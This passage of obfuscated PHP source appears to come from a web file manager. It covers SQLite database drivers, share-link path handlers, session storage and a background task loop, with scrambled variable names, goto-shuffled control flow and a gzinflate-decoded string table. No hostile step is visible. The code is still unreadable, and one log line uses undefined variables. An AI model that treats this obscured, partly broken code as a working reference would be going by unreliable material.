(!$ï·à©ÜÎ) { return; } call_user_func_array(array($this, $›™íÓÑ), array()); } public function routeArgs($”„îúˆ“ = 3) { $¢´ƒ¨Ğ = $this->in[$_SERVER[÷åé¼î][9]]; if (count($¢´ƒ¨Ğ) <= $”„îúˆ“) { return array(); } $±ÏêÙı® = array(); for ($•êõÌ“ = $”„îúˆ“; $•êõÌ“ < count($¢´ƒ¨Ğ); $•êõÌ“ += 2) { $±ÏêÙı®[$¢´ƒ¨Ğ[$•êõÌ“]] = $¢´ƒ¨Ğ[$•êõÌ“ + 1]; $this->in[$¢´ƒ¨Ğ[$•êõÌ“]] = $¢´ƒ¨Ğ[$•êõÌ“ + 1]; } return $±ÏêÙı®; } protected function assign($êö¶È›, $û¹¦é·¸) { $this->values[$êö¶È›] = $û¹¦é·¸; } protected function display($ÅÄğ³™ò) { ob_end_clean(); extract($this->values); require $this->tpl . $ÅÄğ³™ò; } } class DbSqliteBase extends Db { public function __construct($ß®áÙ›ı = '') { $“ÂÎÛâ› =& $_SERVER[÷åé¼î]; if (!extension_loaded($“ÂÎÛâ›[13])) { think_exception(think_lang($“ÂÎÛâ›[14]) . $“ÂÎÛâ›[15]); } if (!empty($ß®áÙ›ı)) { if (!isset($ß®áÙ›ı[$“ÂÎÛâ›[16]])) { $ß®áÙ›ı[$“ÂÎÛâ›[16]] = 438; } $this->config = $ß®áÙ›ı; if (empty($this->config[$“ÂÎÛâ›[17]])) { $this->config[$“ÂÎÛâ›[17]] = array(); } } } public function connect($ªªªø = '', $á×Ş¹¨Ÿ = 0) { $ÚıŒé´í =& $_SERVER[÷åé¼î]; if (!isset($this->linkID[$á×Ş¹¨Ÿ])) { if (empty($ªªªø)) { $ªªªø = $this->config; } $‘Ã‰Ñ¥¬ = !empty($ªªªø[$ÚıŒé´í[17]][$ÚıŒé´í[18]]) ? $ªªªø[$ÚıŒé´í[17]][$ÚıŒé´í[18]] : $this->pconnect; $§¨çæÕ– = $‘Ã‰Ñ¥¬ ? $ÚıŒé´í[19] : $ÚıŒé´í[20]; $this->linkID[$á×Ş¹¨Ÿ] = $§¨çæÕ–($ªªªø[$ÚıŒé´í[21]], $ªªªø[$ÚıŒé´í[16]]); if (!$this->linkID[$á×Ş¹¨Ÿ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$á×Ş¹¨Ÿ], 30000); if (1 != think_config($ÚıŒé´í[22])) { unset($this->config); } } return $this->linkID[$á×Ş¹¨Ÿ]; } public function free() { $this->queryID = null; } public function query($£½ÌÇåŞ) { $’³Š–‰‹ =& $_SERVER[÷åé¼î]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $£½ÌÇåŞ; if ($this->queryID) { $this->free(); } think_action_status($’³Š–‰‹[23], 1); think_status($’³Š–‰‹[24]); $this->queryID = sqlite_query($this->_linkID, $£½ÌÇåŞ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $š¦ê¾ğ‹ = $this->getAll(); return $š¦ê¾ğ‹; } } public function execute($Ùú êí½) { $ÙÌñ£Â£ =& $_SERVER[÷åé¼î]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ùú êí½; if ($this->queryID) { $this->free(); } think_action_status($ÙÌñ£Â£[25], 1); think_status($ÙÌñ£Â£[24]); $¾‹Ûå³ = sqlite_exec($this->_linkID, $Ùú êí½); $this->debug(); if (!1 === $¾‹Ûå³) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[÷åé¼î][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $«Àß¬ƒÏ = sqlite_query($this->_linkID, $_SERVER[÷åé¼î][27]); if (!$«Àß¬ƒÏ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $µã­ûôÖ = sqlite_query($this->_linkID, $_SERVER[÷åé¼î][28]); if (!$µã­ûôÖ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $©±ğº•Å = array(); if ($this->numRows > 0) { for ($¡ÜßÁ—¢ = 0; $¡ÜßÁ—¢ < $this->numRows; $¡ÜßÁ—¢++) { $©±ğº•Å[$¡ÜßÁ—¢] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $©±ğº•Å; } public function getFields($ ¤¬Å·Ç) { $êáâ•Ô¹ =& $_SERVER[÷åé¼î]; $ßŞÏ‚ä¸ = $this->query($êáâ•Ô¹[29] . $ ¤¬Å·Ç . $êáâ•Ô¹[30]); $É®‰Ş = array(); if ($ßŞÏ‚ä¸) { foreach ($ßŞÏ‚ä¸ as $®îêß => $Í×¯“–ñ) { $É®‰Ş[$Í×¯“–ñ[$êáâ•Ô¹[31]]] = array($êáâ•Ô¹[32] => $Í×¯“–ñ[$êáâ•Ô¹[31]], $êáâ•Ô¹[33] => $Í×¯“–ñ[$êáâ•Ô¹[34]], $êáâ•Ô¹[35] => (bool) ($Í×¯“–ñ[$êáâ•Ô¹[36]] === $êáâ•Ô¹[12]), $êáâ•Ô¹[37] => $Í×¯“–ñ[$êáâ•Ô¹[38]], $êáâ•Ô¹[39] => strtolower($Í×¯“–ñ[$êáâ•Ô¹[40]]) == $êáâ•Ô¹[41], $êáâ•Ô¹[42] => strtolower($Í×¯“–ñ[$êáâ•Ô¹[43]]) == $êáâ•Ô¹[44]); } } return $É®‰Ş; } public function getTables($æÖÙÔ…Ü = '') { $æÖ±Éì =& $_SERVER[÷åé¼î]; $óû¬¨¾ = $this->query($æÖ±Éì[45] . $æÖ±Éì[46] . $æÖ±Éì[47]); $Ú­õ ‡² = array(); foreach ($óû¬¨¾ as $úĞ¹„Ë => $Çùß´) { $Ú­õ ‡²[$úĞ¹„Ë] = current($Çùß´); } return $Ú­õ ‡²; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $‚€Ï•—ö =& $_SERVER[÷åé¼î]; $–“¸ÍÁ = sqlite_last_error($this->_linkID); $this->error = $–“¸ÍÁ . $‚€Ï•—ö[4] . sqlite_error_string($–“¸ÍÁ); if ($‚€Ï•—ö[12] != $this->queryStr) { $this->error .= LNG($‚€Ï•—ö[48]) . $this->queryStr; } think_trace($this->error, $‚€Ï•—ö[12], $‚€Ï•—ö[49]); return $this->error; } public function escapeString($‡¡¿ÊÛ) { return sqlite_escape_string($‡¡¿ÊÛ); } public function parseLimit($ä…’²°’) { $Ìıèí‹Ş =& $_SERVER[÷åé¼î]; $‚¢ïİÅÅ = $Ìıèí‹Ş[12]; if (!empty($ä…’²°’)) { $ä…’²°’ = explode($Ìıèí‹Ş[50], $ä…’²°’); if (count($ä…’²°’) > 1) { $‚¢ïİÅÅ .= $Ìıèí‹Ş[51] . $ä…’²°’[1] . $Ìıèí‹Ş[52] . $ä…’²°’[0] . $Ìıèí‹Ş[53]; } else { $‚¢ïİÅÅ .= $Ìıèí‹Ş[51] . $ä…’²°’[0] . $Ìıèí‹Ş[53]; } } return $‚¢ïİÅÅ; } } class DbSqlite3Base extends Db { public function __construct($ü‘£ôú = '') { $úŸÎ äµ =& $_SERVER[÷åé¼î]; if (!class_exists($úŸÎ äµ[54])) { think_exception(think_lang($úŸÎ äµ[14]) . $úŸÎ äµ[55]); } if (!empty($ü‘£ôú)) { if (!isset($ü‘£ôú[$úŸÎ äµ[16]])) { $ü‘£ôú[$úŸÎ äµ[16]] = 438; } $this->config = $ü‘£ôú; if (empty($this->config[$úŸÎ äµ[17]])) { $this->config[$úŸÎ äµ[17]] = array(); } } } public function connect($Ä´˜©³ß = '', $Ø©½¥Àá = 0) { $Íú¡ÎÑé =& $_SERVER[÷åé¼î]; if (!isset($this->linkID[$Ø©½¥Àá])) { if (empty($Ä´˜©³ß)) { $Ä´˜©³ß = $this->config; } $this->linkID[$Ø©½¥Àá] = new SQLite3($Ä´˜©³ß[$Íú¡ÎÑé[21]]); if (!$this->linkID[$Ø©½¥Àá]) { think_exception($this->linkID[$Ø©½¥Àá]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$Ø©½¥Àá]->busyTimeout(30000); if (1 != think_config($Íú¡ÎÑé[22])) { unset($this->config); } } return $this->linkID[$Ø©½¥Àá]; } public function free() { $this->queryID = null; } public function query($Å¿êùµÈ) { $³üÕºÜ =& $_SERVER[÷åé¼î]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Å¿êùµÈ; if ($this->queryID) { $this->free(); } think_action_status($³üÕºÜ[23], 1); think_status($³üÕºÜ[24]); $this->queryID = $this->_linkID->query($Å¿êùµÈ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $É»©ÌÄÍ = $this->getAll(); $this->numRows = count($É»©ÌÄÍ); return $É»©ÌÄÍ; } } public function execute($™Ö«Íë) { $ãËîøíÛ =& $_SERVER[÷åé¼î]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $™Ö«Íë; if ($this->queryID) { $this->free(); } think_action_status($ãËîøíÛ[25], 1); think_status($ãËîøíÛ[24]); $¤Šª±şÛ = $this->_linkID->exec($™Ö«Íë); $this->debug(); if (!1 === $¤Šª±şÛ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[÷åé¼î][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $µº½Íƒå = $this->_linkID->query($_SERVER[÷åé¼î][27]); if (!$µº½Íƒå) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ûİ¿Šòæ = $this->_linkID->query($_SERVER[÷åé¼î][28]); if (!$Ûİ¿Šòæ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $•ÙÉèšÉ = array(); while ($æüĞ²¥ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $•ÙÉèšÉ[] = $æüĞ²¥; } $this->queryID->reset(); return $•ÙÉèšÉ; } public function getFields($¦âëÖÛè) { $¤Ïöæñ© =& $_SERVER[÷åé¼î]; $–Ïà–Ë‚ = $this->query($¤Ïöæñ©[29] . $¦âëÖÛè . $¤Ïöæñ©[30]); $ÖÀÌ¿² = array(); if ($–Ïà–Ë‚) { foreach ($–Ïà–Ë‚ as $¯–ù¡ÊÒ => $©ğŞê÷¼) { $ÖÀÌ¿²[$©ğŞê÷¼[$¤Ïöæñ©[32]]] = array($¤Ïöæñ©[32] => $©ğŞê÷¼[$¤Ïöæñ©[32]], $¤Ïöæñ©[33] => $©ğŞê÷¼[$¤Ïöæñ©[33]], $¤Ïöæñ©[35] => (bool) ($©ğŞê÷¼[$¤Ïöæñ©[35]] === $¤Ïöæñ©[12]), $¤Ïöæñ©[37] => $©ğŞê÷¼[$¤Ïöæñ©[56]], $¤Ïöæñ©[39] => (bool) $©ğŞê÷¼[$¤Ïöæñ©[57]], $¤Ïöæñ©[42] => (bool) $©ğŞê÷¼[$¤Ïöæñ©[57]]); } } return $ÖÀÌ¿²; } public function getTables($¼Ù¿ŞŒ = '') { $ã›‰øŞƒ =& $_SERVER[÷åé¼î]; $óØÖŞÄĞ = $this->query($ã›‰øŞƒ[45] . $ã›‰øŞƒ[46] . $ã›‰øŞƒ[47]); $ë•¿ÅÁ = array(); foreach ($óØÖŞÄĞ as $Ûíº÷““ => $÷ò•ìù·) { $ë•¿ÅÁ[$Ûíº÷““] = current($÷ò•ìù·); } return $ë•¿ÅÁ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ïÇÊ«…Ô =& $_SERVER[÷åé¼î]; $this->error = $this->_linkID->lastErrorMsg(); if ($ïÇÊ«…Ô[12] != $this->queryStr) { $this->error .= LNG($ïÇÊ«…Ô[48]) . $this->queryStr; } think_trace($this->error, $ïÇÊ«…Ô[12], $ïÇÊ«…Ô[49]); return $this->error; } public function escapeString($şŠíåÉª) { $™¾Æ¡¨ =& $_SERVER[÷åé¼î]; if ($this->_linkID) { return $this->_linkID->escapeString($şŠíåÉª); } return str_ireplace($™¾Æ¡¨[58], $™¾Æ¡¨[59], $şŠíåÉª); } public function parseLimit($™‰İÁ‰) { $ÎÜáƒÖ‘ =& $_SERVER[÷åé¼î]; $¸ïµ¦Š = $ÎÜáƒÖ‘[12]; if (!empty($™‰İÁ‰)) { $™‰İÁ‰ = explode($ÎÜáƒÖ‘[50], $™‰İÁ‰); if (count($™‰İÁ‰) > 1) { $¸ïµ¦Š .= $ÎÜáƒÖ‘[51] . $™‰İÁ‰[1] . $ÎÜáƒÖ‘[52] . $™‰İÁ‰[0] . $ÎÜáƒÖ‘[53]; } else { $¸ïµ¦Š .= $ÎÜáƒÖ‘[51] . $™‰İÁ‰[0] . $ÎÜáƒÖ‘[53]; } } return $¸ïµ¦Š; } } goto fŠ¾¶ëÆÄÈ; C¶Íâİç÷: define($_SERVER[÷åé¼î][661], $_SERVER[÷åé¼î][662]); $cdtgknzmfh = $_SERVER[÷åé¼î][663]; $_SERVER[Ìõ–Õö] = explode($_SERVER[÷åé¼î][664], gzinflate(substr($_SERVER[÷åé¼î][665], 10, -8))); goto b—¢ÚŸÇ¼Õ; BÓéä„‹°¯: class PathDriverDbShareLink extends PathDriverDB { public function __construct($½‘õØÍÜ) { $this->pathParse = $½‘õØÍÜ; $this->model = Model($_SERVER[÷åé¼î][1414]); } protected function infoParse($ÒÉğ½š‰, $“±ìœÔê = false, $°á¦ÔÀ = false) { $úÎª¦î˜ =& $_SERVER[÷åé¼î]; return Action($úÎª¦î˜[1250])->sharePathInfo($this->pathParse[$úÎª¦î˜[87]], !0, $“±ìœÔê); } public function remove($Ê‰°¤Šş, $³Æ·µºá = true) { return !0; } public function listPath($•ŸùéÑ™, $ÇŒ»³¢ò = false) { $í¹©÷° =& $_SERVER[÷åé¼î]; $¯×‹‚„ë = parent::listPath($•ŸùéÑ™, $ÇŒ»³¢ò); if (!$¯×‹‚„ë) { return $¯×‹‚„ë; } if (is_array($¯×‹‚„ë[$í¹©÷°[1422]])) { $¯×‹‚„ë[$í¹©÷°[1422]] = Action($í¹©÷°[1250])->shareItemInfo($¯×‹‚„ë[$í¹©÷°[1422]]); } foreach ($¯×‹‚„ë as $áù¡ôš€ => $¹áÈÍ˜Ô) { if (!in_array($áù¡ôš€, array($í¹©÷°[86], $í¹©÷°[85]))) { continue; } foreach ($¹áÈÍ˜Ô as $ê©öÁéı => $ö¹·ğ) { $¯×‹‚„ë[$áù¡ôš€][$ê©öÁéı] = Action($í¹©÷°[1250])->shareItemInfo($ö¹·ğ); } } return $¯×‹‚„ë; } public function listAll($¿˜À§¤‡) { $çËªÈµ =& $_SERVER[÷åé¼î]; $«ûè¨åÏ = IO::info($this->pathParse[$çËªÈµ[87]]); if (!$«ûè¨åÏ) { return array(); } $Õåı˜¹ = $this->model->listAll($¿˜À§¤‡); foreach ($Õåı˜¹ as &$¾í¶µ·©) { $¾í¶µ·©[$çËªÈµ[90]] = Action($çËªÈµ[1250])->shareItemInfo($¾í¶µ·©[$çËªÈµ[90]]); } unset($¾í¶µ·©); return $Õåı˜¹; } } class PathDriverDriverShareItem { public function __construct($Œ²‹à¿) { $this->pathParse = $Œ²‹à¿; } public function __call($€˜ÔÙèë, $»¦Ñå…) { $ÜõĞÆí» =& $_SERVER[÷åé¼î]; if (method_exists($this, $€˜ÔÙèë)) { return; } $´ı‰¤¤¶ = call_user_func_array(array($ÜõĞÆí»[1423], $€˜ÔÙèë), $»¦Ñå…); $„üÄ­ = array($ÜõĞÆí»[1424], $ÜõĞÆí»[1425], $ÜõĞÆí»[1426], $ÜõĞÆí»[1427], $ÜõĞÆí»[602], $ÜõĞÆí»[604], $ÜõĞÆí»[1428], $ÜõĞÆí»[110], $ÜõĞÆí»[1429], $ÜõĞÆí»[1430]); if (in_array($€˜ÔÙèë, $„üÄ­)) { $´ı‰¤¤¶ = $this->getPathOuter($´ı‰¤¤¶); } return $´ı‰¤¤¶; } public function copy($Ëßáø©ø, $ç÷ìÊÌñ, $¦Äğ‡¥ = false, $Ïıº«º = false) { return $this->copyMove($Ëßáø©ø, $ç÷ìÊÌñ, $¦Äğ‡¥, $_SERVER[÷åé¼î][602], $Ïıº«º); } public function move($¹ÚÖëçò, $±Éµ“ö’, $í¤¼…Ä = false, $«ˆËµ×Ã = false) { return $this->copyMove($¹ÚÖëçò, $±Éµ“ö’, $í¤¼…Ä, $_SERVER[÷åé¼î][604], $«ˆËµ×Ã); } private function copyMove($®è–½‚, $Øê•œ‡Ê, $¢Ïô“³¿, $¢Ìö¥ğ, $ÚÅÎ‚ÕÁ = false) { $Ë›¶ì¤² =& $_SERVER[÷åé¼î]; $¯şÓ‰îÓ = $Øê•œ‡Ê; $³Çß§Ø“ = IO::driverMake($Øê•œ‡Ê); if ($³Çß§Ø“->pathParse[$Ë›¶ì¤²[1226]]) { $Øê•œ‡Ê = $³Çß§Ø“->pathParse[$Ë›¶ì¤²[1226]]; } else { $Øê•œ‡Ê = $¯şÓ‰îÓ; } $à®ê£ú = IO::copyMove($®è–½‚, $Øê•œ‡Ê, $¢Ïô“³¿, $¢Ìö¥ğ, $ÚÅÎ‚ÕÁ); $à®ê£ú = $this->getPathOuter($à®ê£ú); return $à®ê£ú; } public function pathThis($Õ¸ûÛŒÎ) { return get_path_this($this->pathParse[$_SERVER[÷åé¼î][87]]); } public function pathFather($Ü¶ï×¨¢) { return get_path_father($this->pathParse[$_SERVER[÷åé¼î][87]]); } public function iconvSystem($—¿ú¼Æ) { return $—¿ú¼Æ; } protected function infoParse($áşâÒ, $«…¿‘œ° = false) { $ï˜ñçÉ™ =& $_SERVER[÷åé¼î]; $ÍôüÁåâ = $this->pathParse[$ï˜ñçÉ™[544]][$ï˜ñçÉ™[1251]] . $this->pathParse[$ï˜ñçÉ™[1244]]; if ($«…¿‘œ°) { $õ¶ê¡µ  = IO::infoWithChildren($ÍôüÁåâ); } else { $õ¶ê¡µ  = IO::info($ÍôüÁåâ); } $íÕ²ÌŠ… = $this->pathParse[$ï˜ñçÉ™[544]]; return Action($ï˜ñçÉ™[1421])->_shareItemeParse($õ¶ê¡µ , $íÕ²ÌŠ…); } public function listAll($—å»Ÿ·Î) { $×°•ßÎÅ =& $_SERVER[÷åé¼î]; $ç›Ò– = IO::listAll($—å»Ÿ·Î); $Ö›á‰² = rtrim($this->pathParse[$×°•ßÎÅ[544]][$×°•ßÎÅ[1251]], $×°•ßÎÅ[8]); foreach ($ç›Ò– as &$‘Œ·ÓÜ¬) { $‘Œ·ÓÜ¬[$×°•ßÎÅ[87]] = $this->pathDriver . $×°•ßÎÅ[8] . ltrim(substr($‘Œ·ÓÜ¬[$×°•ßÎÅ[87]], strlen($Ö›á‰²)), $×°•ßÎÅ[8]); } unset($‘Œ·ÓÜ¬); return $ç›Ò–; } public function listAllSimple($ºÆ¹§Ú™, $±Œ½ªêŸ = false) { $Ï£ïÂèÓ =& $_SERVER[÷åé¼î]; $…‹™€”À = $this->listAll($ºÆ¹§Ú™); $î”Ş‚÷Ë = $this->pathParse[$Ï£ïÂèÓ[479]]; if (trim($î”Ş‚÷Ë, $Ï£ïÂèÓ[8]) == trim(get_path_father($î”Ş‚÷Ë), $Ï£ïÂèÓ[8])) { $±Œ½ªêŸ = !0; } return IO::init($Ï£ïÂèÓ[12])->listAllSimpleMake($…‹™€”À, $î”Ş‚÷Ë, $±Œ½ªêŸ); } public function getPathOuter($”úÓê›Ö) { $Ö«”Â™¡ =& $_SERVER[÷åé¼î]; $Şˆ²ë¯Ş = KodIO::parse($”úÓê›Ö); if ($Şˆ²ë¯Ş[$Ö«”Â™¡[33]] == KodIO::KOD_SHARE_ITEM) { return $Şˆ²ë¯Ş[$Ö«”Â™¡[87]]; } $ı¿Ã¼åİ = KodIO::clear($”úÓê›Ö); $Â¿¨¨Àå = KodIO::clear($this->pathParse[$Ö«”Â™¡[544]][$Ö«”Â™¡[1251]]); $¡÷÷£ä = substr($ı¿Ã¼åİ, strlen($Â¿¨¨Àå)); if (substr($ı¿Ã¼åİ, 0, strlen($Â¿¨¨Àå)) != $Â¿¨¨Àå) { return !1; } return $this->pathParse[$Ö«”Â™¡[1245]] . $Ö«”Â™¡[8] . ltrim($¡÷÷£ä, $Ö«”Â™¡[8]); } public function getType() { $©à÷æı =& $_SERVER[÷åé¼î]; $™˜ŒÛˆ = str_replace($©à÷æı[77], $©à÷æı[12], get_class($this)); return strtolower($™˜ŒÛˆ); } public function isOsDriver($…Áğ¹·†) { return IO::isOsDriver($…Áğ¹·†); } public function info($ÍóĞ›¸ø) { return $this->infoParse($ÍóĞ›¸ø); } public function infoAuth($¡Á·î˜Ì) { return $this->infoParse($¡Á·î˜Ì); } public function infoWithChildren($ê¬’îÌĞ) { return $this->infoParse($ê¬’îÌĞ, !0); } public function infoFull($Ö·‚óîò) { return $this->infoParse($Ö·‚óîò); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($£Ö‹•øÌ) { $this->pathParse = $£Ö‹•øÌ; } protected function infoParse($­·ƒ•§Ñ, $‚®¿§Ôí = false) { $îÒ§¯ =& $_SERVER[÷åé¼î]; return Action($îÒ§¯[1250])->sharePathInfo($this->pathParse[$îÒ§¯[87]], !0, $‚®¿§Ôí); } public function listPath($“À¥ùä¬, $ÄµéÌáÈ = false) { $âï…Ï° =& $_SERVER[÷åé¼î]; $¥¼®¯ = IO::listPath($“À¥ùä¬, $ÄµéÌáÈ); if (!$¥¼®¯) { return $¥¼®¯; } if (is_array($¥¼®¯[$âï…Ï°[1422]])) { $ßÔú§«ó = Action($âï…Ï°[1431])->parsePathChildren($¥¼®¯[$âï…Ï°[1422]], array($âï…Ï°[479] => $“À¥ùä¬)); $¥¼®¯[$âï…Ï°[1422]] = Action($âï…Ï°[1250])->shareItemInfo($ßÔú§«ó); } foreach ($¥¼®¯ as $ğ¡àŠêí => $ôøÅÌ¶ó) { if (!in_array($ğ¡àŠêí, array($âï…Ï°[86], $âï…Ï°[85]))) { continue; } foreach ($ôøÅÌ¶ó as $Ëğ†ÌĞÉ => $ßÔú§«ó) { $ßÔú§«ó = Action($âï…Ï°[1431])->parsePathChildren($ßÔú§«ó, array($âï…Ï°[479] => $“À¥ùä¬)); $¥¼®¯[$ğ¡àŠêí][$Ëğ†ÌĞÉ] = Action($âï…Ï°[1250])->shareItemInfo($ßÔú§«ó); } } return $¥¼®¯; } } goto DÕÒŠà«½×; AòºøõË›Ë: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $¤ôğî•· =& $_SERVER[÷åé¼î]; static $¿Ñ¼Å°š = false; if ($¿Ñ¼Å°š) { return $¿Ñ¼Å°š; } $åöÂ‹Ö = $GLOBALS[$¤ôğî•·[6]][$¤ôğî•·[409]]; self::$sessionTime = $åöÂ‹Ö[$¤ôğî•·[1725]]; $ó§şµ¢Ã = isset($GLOBALS[$¤ôğî•·[1726]]) ? $GLOBALS[$¤ôğî•·[1726]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ó§şµ¢Ã)) { self::$sessionSign = Cookie::get($ó§şµ¢Ã); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($ó§şµ¢Ã, self::$sessionSign, self::$sessionTime); $å—½‰ş = $åöÂ‹Ö[$¤ôğî•·[1727]]; $ĞÙ£²— = $åöÂ‹Ö[$å—½‰ş]; $³¦¥÷¨ì = $åöÂ‹Ö[$¤ôğî•·[892]]; switch ($å—½‰ş) { case $¤ôğî•·[21]: self::$handle = Model($¤ôğî•·[893]); break; case $¤ôğî•·[894]: self::$handle = new CacheRedis($ĞÙ£²—, $³¦¥÷¨ì); break; case $¤ôğî•·[895]: self::$handle = new CacheMemcached($ĞÙ£²—, $³¦¥÷¨ì); break; case $¤ôğî•·[230]: $ĞÙ£²—[$¤ôğî•·[87]] = $ĞÙ£²—[$¤ôğî•·[87]] . $¤ôğî•·[1728]; self::$handle = new CacheFile($ĞÙ£²—, $³¦¥÷¨ì); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $¿Ñ¼Å°š = new self(); return $¿Ñ¼Å°š; } public static function getBySign($„«÷šè) { $¡†­Ş¡ = self::$handle->get($„«÷šè); $¡†­Ş¡ = unserialize($¡†­Ş¡); return is_array($¡†­Ş¡) ? $¡†­Ş¡ : array(); } public static function setBySign($µ’é°¬, $ÙŠÁÄòË) { CacheLock::lock($µ’é°¬); self::$handle->set($µ’é°¬, serialize($ÙŠÁÄòË), self::$sessionTime); CacheLock::unlock($µ’é°¬); } public static function sign($Ó‹±×¥ı = false) { if ($Ó‹±×¥ı) { self::$sessionSign = $Ó‹±×¥ı; } self::init(); return self::$sessionSign; } public static function set($¾›éŞó–, $éÇ‡õ´È = false) { self::init(); if (is_array($¾›éŞó–)) { foreach ($¾›éŞó– as $˜Ñ ÑöÈ => $ØÜ±¥Úı) { array_set_value(self::$data, $˜Ñ ÑöÈ, $ØÜ±¥Úı); } } else { array_set_value(self::$data, $¾›éŞó–, $éÇ‡õ´È); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ÅŠ­½Ì = false) { self::init(); if (!$ÅŠ­½Ì) { return self::$data; } return array_get_value(self::$data, $ÅŠ­½Ì); } public static function remove($ŒÄëà¨») { self::init(); unset(self::$data[$ŒÄëà¨»]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[÷åé¼î][898])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ìÛÉ¦Ì² =& $_SERVER[÷åé¼î]; if (self::valueGet($ìÛÉ¦Ì²[815]) != $ìÛÉ¦Ì²[91]) { return; } if (self::valueGet($ìÛÉ¦Ì²[1729]) == $ìÛÉ¦Ì²[91]) { $â¹ñ ¦Ş = self::valueGet($ìÛÉ¦Ì²[1730]); if (time() - $â¹ñ ¦Ş > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($ìÛÉ¦Ì²[1729], $ìÛÉ¦Ì²[91]); self::log($ìÛÉ¦Ì²[1731] . ACTION . $ìÛÉ¦Ì²[1732]); Hook::bind($ìÛÉ¦Ì²[1733], $ìÛÉ¦Ì²[1734]); $ŒÖˆï³İ = 0; while (!0) { self::cacheClear(); if (self::valueGet($ìÛÉ¦Ì²[815]) != $ìÛÉ¦Ì²[91]) { self::valueSet($ìÛÉ¦Ì²[1729], $ìÛÉ¦Ì²[228]); self::log($ìÛÉ¦Ì²[1735]); die; } $‚óŸà¨ = time(); if ($‚óŸà¨ - $ŒÖˆï³İ >= 60) { self::valueSet(array($ìÛÉ¦Ì²[1729] => $ìÛÉ¦Ì²[91], $ìÛÉ¦Ì²[1730] => $‚óŸà¨)); $ŒÖˆï³İ = $‚óŸà¨; } if (!file_exists(USER_SYSTEM . $ìÛÉ¦Ì²[1736])) { self::valueSet(array($ìÛÉ¦Ì²[1729] => $ìÛÉ¦Ì²[228], $ìÛÉ¦Ì²[815] => $ìÛÉ¦Ì²[228])); self::log($ìÛÉ¦Ì²[1737]); die; } $™ú¢“…¾ = file_get_contents(BASIC_PATH . $ìÛÉ¦Ì²[1738]); $øƒ‹û†¨ = KOD_VERSION . $ìÛÉ¦Ì²[10] . KOD_VERSION_BUILD; $Û¶ô¶—¼ = match_text($™ú¢“…¾, $ìÛÉ¦Ì²[1739]) . $ìÛÉ¦Ì²[10] . match_text($™ú¢“…¾, $ìÛÉ¦Ì²[1740]); if ($Û¶ô¶—¼ != $øƒ‹û†¨) { self::restart(); self::log("\x73\164\157\160\145\144\x2e\133\166\145\162\x73\x69\157\156\x20\165\160\x64\141\x74\145\73{$versionNow}\40\x3d\76\x20{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $”¾¦¤æï =& $_SERVER[÷åé¼î]; http_close(); $GLOBALS[$”¾¦¤æï[1741]] = 1; $_SERVER[$”¾¦¤æï[1742]] = $”¾¦¤æï[1743]; $_COOKIE = array(); $GLOBALS[$”¾¦¤æï[1744]] = 1; $GLOBALS[$”¾¦¤æï[1745]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $æÏêÂÕó =& $_SERVER[÷åé¼î]; http_close(); self::valueSet($æÏêÂÕó[815], $æÏêÂÕó[228]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($æÏêÂÕó[1729] => $æÏêÂÕó[228], $æÏêÂÕó[815] => $æÏêÂÕó[91])); self::log($æÏêÂÕó[1746]); } public static function taskSwitch() { $„•…¬¦ò =& $_SERVER[÷åé¼î]; $ı¨Òıİ = self::valueGet($„•…¬¦ò[815]) == $„•…¬¦ò[91] ? $„•…¬¦ò[228] : $„•…¬¦ò[91]; self::valueSet($„•…¬¦ò[815], $ı¨Òıİ); } public static function shutdownEvent() { $½ĞÈØÉë =& $_SERVER[÷åé¼î]; self::valueSet($½ĞÈØÉë[1729], $½ĞÈØÉë[228]); 